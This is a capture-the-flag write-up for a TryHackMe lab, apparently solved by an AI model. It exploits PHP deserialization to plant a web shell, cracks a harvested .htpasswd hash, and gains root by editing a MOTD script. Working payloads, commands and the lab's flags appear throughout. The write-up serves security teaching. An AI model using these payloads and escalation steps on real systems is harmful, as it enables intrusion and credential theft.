### TryHackMe - Debug CTF Writeup
*(solved by gemini 🤖🤖🤖)*
 
 PHP Deserialization Security Assessment: Target 10.49.175.77

## Overview
This assessment focuses on a PHP deserialization vulnerability found on the target system. The vulnerability allowed for remote code execution (RCE) and subsequent privilege escalation to the root user.

---

## 1. Initial Enumeration
### Port Scanning
A fast scan revealed two open ports:
- **22/tcp**: SSH
- **80/tcp**: HTTP (Apache 2.4.18)

### Web Directory Discovery
Using `ffuf`, I discovered a `/backup` directory:
```bash
ffuf -u http://10.49.175.77/FUZZ -w /usr/share/wordlists/dirb/common.txt
```
This directory contained `index.php.bak`, which provided the source code for the application.

---

## 2. Vulnerability Analysis: PHP Deserialization
The `index.php.bak` file contained the following vulnerable code snippet:

```php
class FormSubmit {
    public $form_file = 'message.txt';
    public $message = '';

    public function SaveMessage() {
        $NameArea = $_GET['name']; 
        $EmailArea = $_GET['email'];
        $TextArea = $_GET['comments'];
        $this->message = "Message From : " . $NameArea . " || From Email : " . $EmailArea . " || Comment : " . $TextArea . "\n";
    }

    public function __destruct() {
        file_put_contents(__DIR__ . '/' . $this->form_file, $this->message, FILE_APPEND);
        echo 'Your submission has been successfully saved!';
    }
}

$debug = $_GET['debug'] ?? '';
$messageDebug = unserialize($debug);
```

### In-Depth Explanation of the Vulnerability
**PHP Deserialization** (also known as PHP Object Injection) occurs when user-supplied input is passed to the `unserialize()` function. In PHP, serialization is the process of converting a data structure or object into a string format that can be stored or transmitted. Deserialization is the reverse process.

The danger lies in **Magic Methods**. These are special methods in PHP classes that are automatically triggered by certain events. In this challenge, the `__destruct()` magic method is key. It is called when an object is destroyed or when the script ends.

#### The Exploit Chain:
1.  **Injection**: The attacker provides a serialized string to the `debug` parameter.
2.  **Instantiation**: `unserialize()` creates an object of the `FormSubmit` class based on the attacker's string.
3.  **Property Control**: The attacker can define the values of the `$form_file` and `$message` properties within the serialized string.
4.  **Execution**: When the script finishes, the `__destruct()` method is called. It uses the attacker-controlled properties in `file_put_contents()`.
5.  **Result**: Arbitrary file write. By setting `$form_file` to `shell.php` and `$message` to a PHP web shell, the attacker achieves Remote Code Execution (RCE).

---

## 3. Exploitation
### Payload Generation
I created a script to generate the serialized payload:
```php
<?php
class FormSubmit {
    public $form_file = 'shell.php';
    public $message = '<?php system($_GET["cmd"]); ?>';
}
echo urlencode(serialize(new FormSubmit()));
?>
```
**Payload**: `O%3A10%3A%22FormSubmit%22%3A2%3A%7Bs%3A9%3A%22form_file%22%3Bs%3A9%3A%22shell.php%22%3Bs%3A7%3A%22message%22%3Bs%3A30%3A%22%3C%3Fphp+system%28%24_GET%5B%22cmd%22%5D%29%3B+%3F%3E%22%3B%7D`

### Gaining a Web Shell
Sending the payload to the server:
```bash
curl -s "http://10.49.175.77/index.php?debug=[PAYLOAD]"
```
This created `shell.php` in the web root. Verification:
```bash
curl -s "http://10.49.175.77/shell.php?cmd=id"
# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 4. Post-Exploitation & Lateral Movement
### Credential Harvesting
I found a `.htpasswd` file in `/var/www/html/`:
```text
james:$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1
```
Using `john` and `rockyou.txt`, the password for `james` was cracked: **jamaica**.

### SSH Access
I logged in as `james` via SSH:
```bash
ssh james@10.49.175.77
```
**User Flag**: `7e37c84a66cc40b1c6bf700d08d28c20`

---

## 5. Privilege Escalation
### MOTD Script Exploitation
A note in James's home directory (`Note-To-James.txt`) suggested he had permissions to modify the SSH welcome message. I checked the permissions of `/etc/update-motd.d/`:
```bash
ls -la /etc/update-motd.d/
```
The user `james` had write access to these scripts, which are executed by **root** whenever a user logs in via SSH.

### Execution
I appended a command to the header script to capture the root flag:
```bash
echo 'cat /root/root.txt > /tmp/root_flag.txt' >> /etc/update-motd.d/00-header
```
After logging in again, the command executed as root.
**Root Flag**: `3c8c3d0fe758c320d158e32f68fabf4b`

---

## 6. Recommendations
1.  **Avoid `unserialize()` on User Input**: Use safer alternatives like `json_decode()` which do not trigger magic methods.
2.  **File Permissions**: Restrict write access to system directories like `/etc/update-motd.d/` to only the root user.
3.  **Password Policy**: Ensure strong, non-dictionary passwords for all users and services.
